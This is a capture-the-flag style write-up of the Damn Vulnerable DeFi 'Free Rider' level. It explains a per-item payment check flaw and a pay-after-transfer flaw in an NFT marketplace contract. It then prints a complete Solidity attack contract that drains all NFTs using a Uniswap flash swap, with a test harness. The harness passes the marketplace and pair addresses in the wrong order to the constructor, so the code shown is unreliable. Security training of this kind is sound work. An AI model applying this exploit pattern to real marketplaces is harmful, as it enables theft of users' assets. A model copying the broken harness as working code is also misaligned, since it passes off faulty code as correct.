# Free Rider

A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

A critical vulnerability has been reported, claiming that all tokens can be taken. Yet the developers don't know how to save them!

They’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way. The recovery process is managed by a dedicated smart contract.

You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.

If only you could get free ETH, at least for an instant.


# Challenge overview

[official site](https://www.damnvulnerabledefi.xyz/challenges/free-rider/)  
I am trying to reduce fluffs and indirect stuffs as much as posible

## Let’s dive

The Free Rider challenge is the 10th level in the Damn Vulnerable DeFi V4 series. The goal is simple: Drain all the NFT tokens from the pool.

It has 2 contracts
1) FreeRiderMarketplace.sol: (“Buy or sell NFT here”)
2) FreeRiderRecoveryManager.sol: (“Submit the drained NFTs here”)

In this system you can sell or buy NFTs. The price is fixed as 15 ETH per NFT.

### FreeRiderMarketplace.sol allows us to :
Buy as much NFTs as we want in single tx, and it also allows us to sell all the NFTs we want in a single tx.


### FreeRiderRecoveryManager.sol :
This contract is just deployed to recover all the NFTs afte vulnerability got reported.

### Logic:
The platform allows us to buy or sell NFTs in a single transaction, each NFT costs 15 ether.

## How do we exploit it ?

As we see on the contracts, There are two vulnerabilities which causes the whole protocol into major risk. In `FreeRiderMarketplace::buyOne()` function there is an conditional statement :
```solidity
if (msg.value < priceToPay) {
    revert InsufficientPayment();
}
```
The statement is kinda good until it is for single transaction, but the protocol can do many tx in a single deploy using `buyMany()` function. So, it causes major issue that a person can buy all the NFTs by paying only 15 ETH. This is one of the major vulnerability comes first, wait there is another one we haven't talked yet.  

Okay! if u look at these lines:
```solidity
        DamnValuableNFT _token = token; // cache for gas savings
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
```
Right below to the conditions where first vulnerability arised. The protocol first assigns us the NFT and then pays the owner the amount of the NFT. Sounds smooth right but it isn't. The protocol sends NFTs first means we are the owner of the NFTs already and pays the owner means the protocol will pay us the ETH back!. That means we will get back the 15 ETHs too we used to drain all the NFTs too.  

Hope something is clicking in your mind! But wait, there is a problem. README says we just have 0.1 ETH and to execute we need 15 ETH minimum. `Where there is a will, there is a way!` . You can visit the test file once. The lab has already provided us access to `uniswapV2Pair` protocol. That means we can take flash loan, drain the NFTs and return the loan.


## POC

Now, before going to the POC you should try to write exploit yourself and if you get errors and confusions here is the POC:

```solidity
contract AttackFreeRider {
    IUniswapV2Pair public pair;
    FreeRiderNFTMarketplace public marketplace ;

    WETH public weth;
    DamnValuableNFT public nft;

    address public recoveryContract;
    address public player;

    uint private constant NFT_PRICE = 15 ether;
    uint[] private tokens = [0,1,2,3,4,5];

    constructor (address _pair, address _marketplace, address _weth, address _nft, address _recoveryContract) payable {
        pair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        weth = WETH(payable(_weth));
        nft = DamnValuableNFT(_nft);
        recoveryContract = _recoveryContract;
        player = msg.sender;
    }

    function start() public {
        // 1. Request a flashswap of 15 Eth from uniswap pair
        pair.swap(NFT_PRICE, 0 , address(this), "1");
    }

    function uniswapV2Call(address /*sender*/, uint /*amount*/, uint256, bytes calldata /*data*/) external {
        // Access control 
        require(msg.sender == address(pair));
        require(tx.origin == player);

        // 2. unwrap WETH to ETH
        weth.withdraw(NFT_PRICE);

        // 3. Buy all the NFTs from the pool 
        marketplace.buyMany{ value : NFT_PRICE }(tokens);

        // 4. Pay the 15 weth with charges hmm 0.3%
        uint256 amountToReturn = NFT_PRICE * 1004/1000;
        weth.deposit{value : amountToReturn}();
        weth.transfer(address(pair), amountToReturn);

        // 5. Send NFTs to recovery account so we can get the bounty
        bytes memory data = abi.encode(player);
        for(uint256 i ; i < tokens.length ; i ++) {
            nft.safeTransferFrom(address(this), recoveryContract, i, data);
        }
    }

    // To make sure safeTransferfrom won't revert
    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4){
            return 0x150b7a02;
    }

    receive() external payable{}
}

```

Now, you just need to cal the contract inside the test fuction.
```solidity
function test_freeRider() public checkSolvedByPlayer {
    AttackFreeRider attackFreeRider = new AttackFreeRider{value : 0.045 ether}(
        address(marketplace),
        address(uniswapPair),
        address(weth),
        address(nft),
        address(recoveryManager)
    );

    attackFreeRider.start();
}
```

>Okay! This Much 

### If you found this write up useful give a star to the **[repo](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions)** and don't forget to follow your buddy **[0xscarfac3](https://github.com/0xscarfac3)**